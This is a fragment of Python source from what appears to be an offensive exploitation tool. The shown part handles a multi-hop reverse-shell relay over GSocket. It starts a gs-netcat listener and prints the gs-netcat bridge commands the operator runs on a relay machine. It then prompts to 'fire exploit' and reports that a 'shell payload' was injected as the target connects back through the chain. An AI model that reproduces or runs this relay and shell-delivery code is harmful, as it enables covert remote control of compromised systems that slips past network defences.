        ...
        if choice == "0":
            ...
            if use_shell:
                ...
                if shell_mode == "l2relay":
                    ...
                    c.print("[dim]Starting L1 GSocket listener...[/]")
                    l1_gs_proc = start_gsocket_l1_listener(l1_tok)
                    if l1_gs_proc:
                        c.print(
                            f"[green]L1 listener started[/] PID={l1_gs_proc.pid}  "
                            f"secret=[bold cyan]{l1_tok}[/]"
                        )
                    else:
                        c.print(
                            "[red]gs-netcat not found on this machine.[/]\n"
                            f"  Start L1 listener manually: "
                            f"[bold cyan]gs-netcat -l -s \"{l1_tok}\"[/]"
                        )

                    c.print(
                        f"\n[bold yellow]Now start L2 bridge on relay machine:[/]\n"
                        f"  [bold cyan]gs-netcat -l -p {l2_port} -s "
                        f"\"{l2_sec or 'L2_SECRET'}\" | gs-netcat -s \"{l1_tok}\"[/]\n"
                        f"\n[dim]L2's connect side dials L1 via GSocket relay —"
                        f" L1 must be listening first.[/]"
                    )
                    Prompt.ask(
                        "[dim]Press Enter when L2 bridge is running to fire exploit[/]",
                        default="",
                    )
                else:
            ...
            if result.success:
                ...
                if cb_method == "gsocket" and gs_receiver:
                    ...
                    c.print(Panel(
                        f"[green bold]Shell payload injected![/] — L3 is connecting to L2 → GSocket → L1.\n\n"
                        f"  L1 listener: "
                        f"{'PID ' + str(l1_gs_proc.pid) if l1_gs_proc else '[red]not running[/red]'}\n"
                        f"  secret=[bold cyan]{l1_tok or 'YOUR_L1_TOKEN'}[/]\n\n"
                        f"  [dim]Waiting for shell to arrive via GSocket relay...[/]",
                        title="[bold green]L2 Relay — Shell Incoming[/]",
                        expand=False,
                    ))
                    if l1_gs_proc:
